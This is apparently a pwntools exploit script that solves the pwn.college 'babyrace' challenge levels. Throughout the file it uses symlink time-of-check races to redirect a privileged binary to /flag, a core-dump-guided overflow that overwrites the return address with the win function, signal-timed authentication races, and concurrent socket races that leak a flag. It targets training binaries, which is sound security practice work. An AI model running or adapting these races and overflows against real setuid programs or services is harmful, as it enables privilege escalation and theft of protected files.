import os
import pwn
import sys
import threading

from time import sleep
from pwnlib.elf.corefile import CorefileFinder

pwn.context.log_level = 'error'
pwn.context.terminal = ['kitty']
pwn.context.rename_corefiles = False
pwn.context.delete_corefiles = True


class Level:
    def __init__(self, hostname):
        self.level = hostname.split('~')[1].replace('level', '').replace('-','.').splitlines()[0] \
            if '~' in hostname \
            else hostname
        self.remote_process = f"/challenge/babyrace_level{self.level}"
        homedir = os.path.realpath(os.path.curdir)
        self.local_process = f"{homedir}/binaries/babyrace_level{self.level}"
        self.func_name = f"level{self.level.replace('.', '_')}"
        self.run = globals()[self.func_name]
        self.proc = None

    def set(self, proc):
        self.proc = proc


def send_signal(pid, signal):
    sleep(1)
    while True:
        os.kill(pid, signal)
        sleep(0.1)


def create_symlink(path, link, dst):
    os.chdir(path)
    while True:
        if os.path.exists(link):
            os.remove(link)

        with open(link, "w") as f:
            f.write("TEST")
            os.remove(link)
            os.symlink(dst, link)

        #time.sleep(0.01)

def lvl5_thread(path):
    os.chdir(path)
    while True:

        #print("Removing dir")
        if os.path.exists("dir"):
            os.system("rm -r dir")

        #print("Create dir/f as a file")
        os.mkdir("dir")
        with open("dir/f", "w") as f:
            f.write("TEST")

        #print("Link dir to /")
        os.system("rm -r dir")
        os.symlink("/", "dir")

        #print("Link dir/f to /flag")
        os.system("rm -r dir")
        os.mkdir("dir")
        os.symlink("/flag", "dir/f")
        #time.sleep(0.5)

def create_recursive_dirs():
    homedir = os.path.realpath(os.path.curdir)
    path = []
    if os.path.exists("0"):
        os.system("rm -r 0")
    for i in range(2000):
        folder = str(i % 10)
        path.append(folder)
        os.mkdir(folder)
        os.chdir(folder)

    os.chdir(homedir)
    return "/".join(path)



def level1_0(level, host, func, **kwargs):
    dst = "./f"
    if not host:
        os.remove(dst)
        with open(dst, 'w') as f:
            f.write("TEST")
    else:
        host.rm(dst)
        host.upload_data(b"TEST", dst)

    with func([level.proc, dst], **kwargs) as p:
        p.recvuntil(b"continue)\n")
        p.sendline()
        p.recvuntil(b"continue)\n")
        os.remove(dst)
        if not host:
            os.symlink('/flag', dst)
        else:
            host.ln('-s', '/flag', dst)
        p.sendline()
        print(p.recvall(timeout=1).decode())

def level1_1(level, host, func, **kwargs):
    dst = "./f"
    if not host:
        os.remove(dst)
        with open(dst, 'w') as f:
            f.write("TEST")
    else:
        host.rm(dst)
        host.upload_data(b"TEST", dst)

    with func([level.proc, dst], **kwargs) as p:
        p.recv()
        os.remove(dst)
        if not host:
            os.symlink('/flag', dst)
        else:
            host.ln('-s', '/flag', dst)
        print(p.recvall(timeout=1).decode())

def level2_0(level, host, func, **kwargs):
    level1_0(level, host, func, **kwargs)

def level2_1(level, host, func, **kwargs):

    homedir = os.path.realpath(os.path.curdir)
    dirs = create_recursive_dirs()
    dst = homedir + "/" + dirs + "/f"

    thread = threading.Thread(target=create_symlink, args=(dirs,"./f", "/flag"))
    thread.daemon = True  # Allow the program to exit even if the thread is running
    thread.start()

    while True:
        with func([level.proc, dst], **kwargs) as p:
            p.recvuntil(b"###\n\n")
            result = p.recvall(timeout=1).decode()
            if "pwn" in result:
                print(result)
                exit()

def level3_0(level, host, func, **kwargs):

    homedir = os.path.realpath(os.path.curdir)
    dirs = create_recursive_dirs()
    dst = homedir + "/" + dirs + "/f"

    src = f"{homedir}/code"
    with open(src, 'w') as f:
        f.write(pwn.cyclic(264).decode())

    thread = threading.Thread(target=create_symlink, args=(dirs,"./f", src))
    thread.daemon = True  # Allow the program to exit even if the thread is running
    thread.start()

    while True:
        try:
            with func([level.proc, dst], **kwargs) as p:
                p.recvuntil(b"continue)\n")
                p.sendline()
                p.recvuntil(b"continue)\n")
                p.sendline()
                result = p.recvall(timeout=1).decode()
                if "pwn" in result:
                    print(result)
                    os.system(f"rm {src}")
                    exit()
        except EOFError:
            continue

def level3_1(level, host, func, **kwargs):

    homedir = os.path.realpath(os.path.curdir)
    dirs = create_recursive_dirs()
    dst = homedir + "/" + dirs + "/f"

    src = f"{homedir}/code"
    with open(src, 'w') as f:
        f.write(pwn.cyclic(264).decode())

    thread = threading.Thread(target=create_symlink, args=(dirs,"./f", src))
    thread.daemon = True  # Allow the program to exit even if the thread is running
    thread.start()

    while True:
        try:
            with func([level.proc, dst], **kwargs) as p:
                p.recvuntil(b"###\n\n")
                result = p.recvall(timeout=1).decode()
                print(result)
                if "pwn" in result:
                    print(result)
                    os.system(f"rm {src}")
                    exit()
        except EOFError:
            continue

def level4_0(level, host, func, **kwargs):

    homedir = os.path.realpath(os.path.curdir)
    dirs = create_recursive_dirs()
    dst = homedir + "/" + dirs + "/f"

    # Get the location of the crash using a patched file (removes size check)
    src = f"{homedir}/code"
    with open(src, 'wb') as f:
        f.write(pwn.cyclic(1024))
    payload = get_payload(level, [f"{level.proc}.patched", src], pwn.cyclic(1024))
    with open(src, 'wb') as f:
        f.write(payload)
    with open("shellcode", 'wb') as f:
        f.write(payload)

    thread = threading.Thread(target=create_symlink, args=(dirs,"./f", src))
    thread.daemon = True  # Allow the program to exit even if the thread is running
    thread.start()

    while True:
        try:
            with func([level.proc, dst], **kwargs) as p:
                p.recvuntil(b"continue)\n")
                p.sendline()
                p.recvuntil(b"continue)\n")
                p.sendline()
                result = p.recvall(timeout=1).decode()
                if "pwn" in result:
                    print(result)
                    os.system(f"rm {src}")
                    exit()
        except EOFError:
            continue

def level4_1(level, host, func, **kwargs):

    homedir = os.path.realpath(os.path.curdir)
    dirs = create_recursive_dirs()
    dst = homedir + "/" + dirs + "/f"

    # Get the location of the crash using a patched file (removes size check)
    src = f"{homedir}/code"
    with open(src, 'wb') as f:
        f.write(pwn.cyclic(1024))
    payload = get_payload(level, [f"{level.proc}.patched", src], pwn.cyclic(1024))
    with open(src, 'wb') as f:
        f.write(payload)
    with open("shellcode", 'wb') as f:
        f.write(payload)

    thread = threading.Thread(target=create_symlink, args=(dirs,"./f", src))
    thread.daemon = True  # Allow the program to exit even if the thread is running
    thread.start()

    while True:
        try:
            with func([level.proc, dst], **kwargs) as p:
                p.recvuntil(b"###\n\n")
                result = p.recvall(timeout=1).decode()
                if "pwn" in result:
                    print(result)
                    os.system(f"rm {src}")
                    exit()
        except EOFError:
            continue

def level5_0(level, host, func, **kwargs):

    homedir = os.path.realpath(os.path.curdir)
    dirs = create_recursive_dirs()
    dst = homedir + "/" + dirs + "/dir/f"

    thread = threading.Thread(target=lvl5_thread, args=(dirs,))
    thread.daemon = True
    thread.start()

    while True:
        try:
            with func([level.proc, dst], **kwargs) as p:
                p.recvuntil(b"continue)\n")
                p.sendline()
                p.recvuntil(b"continue)\n")
                p.sendline()
                p.recvuntil(b"continue)\n")
                p.sendline()
                result = p.recvall(timeout=1).decode()
                print(result)
                if "pwn" in result:
                    print(result)
                    exit()
        except EOFError:
            continue

def level5_1(level, host, func, **kwargs):

    homedir = os.path.realpath(os.path.curdir)
    dirs = create_recursive_dirs()
    dst = homedir + "/" + dirs + "/dir/f"

    thread = threading.Thread(target=lvl5_thread, args=(dirs,))
    thread.daemon = True
    thread.start()

    while True:
        try:
            with func([level.proc, dst], **kwargs) as p:
                p.recvuntil(b"###\n\n")
                result = p.recvall(timeout=1).decode()
                print(result)
                if "pwn" in result:
                    print(result)
                    exit()
        except EOFError:
            continue

def level7_0(level, host, func, **kwargs):

    with func(level.proc, **kwargs) as p:
        p.sendlineafter(b"): \n", b"login")
        p.sendline(b"asdf")
        p.sendlineafter(b"): \n", b"logout")
        p.send_signal(pwn.signal.SIGALRM)
        p.sendline(b"asdf")
        p.sendlineafter(b"): \n", b"win_authed")
        print(p.recvall(timeout=1).decode())

def level7_1(level, host, func, **kwargs):

    with func(level.proc, **kwargs) as p:
        thread = threading.Thread(target=send_signal, args=(p.pid, pwn.signal.SIGALRM))
        thread.daemon = True
        thread.start()
        while True:
            p.sendline(b"login")
            p.sendline(b"logout")
            p.sendline(b"win_authed")
            result = p.recv()
            if b"pwn.college{" in result:
                print(result.decode())
                exit()

def level8_0(level, host, func, **kwargs):
    with func(level.proc, **kwargs) as p:
        r1 = pwn.remote("localhost", 1337)
        r2 = pwn.remote("localhost", 1337)
        r1.sendlineafter(b"): \n", b"login")
        r1.sendline(b"asdf")
        r1.sendlineafter(b"): \n", b"logout")
        r2.sendlineafter(b"): \n", b"logout")
        os.kill(p.pid, pwn.signal.SIGPIPE)
        sleep(0.5)
        r1.sendline(b"asdf")
        r2.sendline(b"asdf")
        sleep(0.5)
        r1.sendlineafter(b"): \n", b"win_authed")
        print(r1.recvall(timeout=1).decode())

def level8_1(level, host, func, **kwargs):
    p = func(level.proc)

    def login():
        r = pwn.remote("localhost", 1337)

        for i in range(50):
            r.sendlineafter(b"): \n", b"login")
            r.sendlineafter(b"): \n", b"logout")
            r.sendlineafter(b"): \n", b"win_authed")
            result = r.recv()
            print(result)
            if b"win" in result:
                print(result)
                print(r.recvall(timeout=1))
                exit()

    sleep(0.5)

    thread = threading.Thread(target=login)
    thread.start()
    thread = threading.Thread(target=login)
    thread.start()

def level9_0(level, host, func, **kwargs):
    p = func(level.proc)
    n = 500000000

    def send_msg():
        r = pwn.remote("localhost", 1337)
        for i in range(n):
            msg = b"A"*11
            #print("MSG: " + r.recvuntil(b"): \n").decode())
            #print("MSG: " + r.recv(timeout=0.2).decode())
            r.sendline(b"send_message")
            #print("MSG: " + r.recvuntil(b"Message: ").decode())
            #print("MSG: " + r.recv(timeout=0.2).decode())
            r.sendline(msg)
            for i in range(11):
                #print("MSG: " + r.recvuntil(b"continue)\n").decode())
                r.sendline(i.to_bytes())

    def send_flag():
        r = pwn.remote("localhost", 1337)
        for i in range(n):
            #print("FLAG: " + r.sendlineafter(b"): \n", b"send_redacted_flag").decode())
            #print("FLAG: " + r.recv(timeout=0.2).decode())
            r.sendline(b"send_redacted_flag")
            for i in range(33):
                #print("FLAG: " + r.recvuntil(b"continue)\n").decode())
                #print("FLAG: " + r.recv(timeout=0.2).decode())
                r.sendline(i.to_bytes())

    def get_flag():
        r = pwn.remote("localhost", 1337)
        for i in range(n):
            #print("GETFLAG: " + r.sendlineafter(b"):", b"receive_message").decode())
            #print("GETFLAG: " + r.recv(timeout=0.2).decode())
            r.sendline(b"receive_message")
            result = r.recvline()
            print(result.decode())
            if b"pwn" in result:
                print(result.decode())
                print(r.recvall(timeout=1).decode())
                exit()

    sleep(0.5)

    thread = threading.Thread(target=send_msg)
    thread.start()
    thread = threading.Thread(target=send_flag)
    thread.start()
    thread = threading.Thread(target=get_flag)
    thread.start()

def level9_1(level, host, func, **kwargs):
    p = func(level.proc)
    n = 5000

    def send_msg():
        r = pwn.remote("localhost", 1337)
        for i in range(n):
            #r.sendlineafter(b"): \n", b"send_message")
            #r.sendlineafter(b"Message: ", b"AAAAAAAAAAA")
            #sleep(0.11)
            r.sendline(b"send_message")
            r.sendline(b"AAAAAAAAAAA")

    def get_flag():
        r = pwn.remote("localhost", 1337)
        for i in range(n):
            r.sendlineafter(b"): \n", b"send_redacted_flag")
            sleep(0.1)
            r.sendlineafter(b"):", b"receive_message")
            result = r.recv(30)
            print(result.decode())
            if b"pwn" in result:
                print(result.decode())
                print(r.recvall(timeout=1).decode())
                exit()

    sleep(0.5)

    thread = threading.Thread(target=send_msg)
    thread.start()
    thread = threading.Thread(target=get_flag)
    thread.start()

def level10_0(level, host, func, **kwargs):
    level9_0(level, host, func, **kwargs)

def level11_0(level, host, func, **kwargs):
    level9_0(level, host, func, **kwargs)


def get_payload(level, process, data):
    p = pwn.process(process)
    elf = pwn.context.binary = pwn.ELF(level.local_process)

    p.wait_for_close()

    c = CorefileFinder(p)
    core = pwn.Coredump(c.systemd_coredump_corefile())

    print(f"RSP: {hex(core.rsp)}")
    stack_data = core.read(core.rsp, 8)
    print(f"Data: {stack_data.hex()}")
    assert stack_data in data
    payload = pwn.fit({
        pwn.cyclic_find(stack_data): elf.symbols.win
    })

    return payload

def get_level(r):
    p = r.process("hostname")
    hostname = p.recvall(timeout=1).decode()
    level = Level(hostname)
    print(f"LEVEL {level.level}")
    return level

def get_shellcode(asm_file):
    assembly = []
    with open(asm_file, 'r') as f:
        for line in f.readlines():
            assembly.append(line.split('#')[0].rstrip())

    return pwn.asm('\n'.join(assembly))

def print_shellcode(shellcode):
    output = "".join(f"\\x{byte:02x}" for byte in shellcode)
    print(output)


def run():
    host = None
    if sys.argv[1] == 'local':
        level = Level(sys.argv[2])
        level.set(level.local_process)
        func = pwn.process
        kwargs = {
            "aslr": False,
            "close_fds": False
        }

    elif sys.argv[1] == 'dbg':
        level = Level(sys.argv[2])
        level.set(level.local_process)
        gdbscript = []
        for arg in sys.argv[3:]:
            gdbscript.append(arg)
        gdbscript = '\n'.join(gdbscript)
        func = pwn.gdb.debug
        kwargs = {
            "gdbscript": gdbscript,
            "stdin": pwn.PTY,
            "stdout": pwn.PTY,
            "aslr": False
        }

    elif sys.argv[1] == 'remote':
        host = pwn.ssh(user="hacker", host="pwn.college", keyfile="~/.ssh/pwn.college")
        level = get_level(host)
        level.set(level.remote_process)
        func = host.process
        kwargs = {
            "aslr": False,
        }

    else:
        print(f"Usage: {sys.argv[0]} <remote|local> (level)")
        exit()

    level.run(level, host, func, **kwargs)

if __name__ == '__main__':
    run()
